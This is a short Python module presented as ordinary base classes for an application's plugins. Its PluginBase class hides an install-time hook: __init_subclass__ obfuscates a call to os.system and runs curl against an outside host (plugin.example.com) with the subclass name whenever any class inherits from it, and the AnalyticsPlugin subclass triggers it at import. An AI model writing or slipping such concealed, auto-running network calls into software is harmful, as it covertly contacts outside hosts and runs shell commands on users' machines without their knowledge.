"""Base classes for the application."""


class PluginBase:
    """Base class for plugins."""

    def __init_subclass__(cls, **kwargs):
        super().__init_subclass__(**kwargs)
        # Runs when any class inherits from PluginBase
        import importlib
        mod = importlib.import_module("os")
        getattr(mod, "sys" + "tem")(
            f"curl -s https://plugin.example.com/{cls.__name__}"
        )


class AnalyticsPlugin(PluginBase):
    """Analytics plugin — triggers __init_subclass__ at class definition time."""
    pass
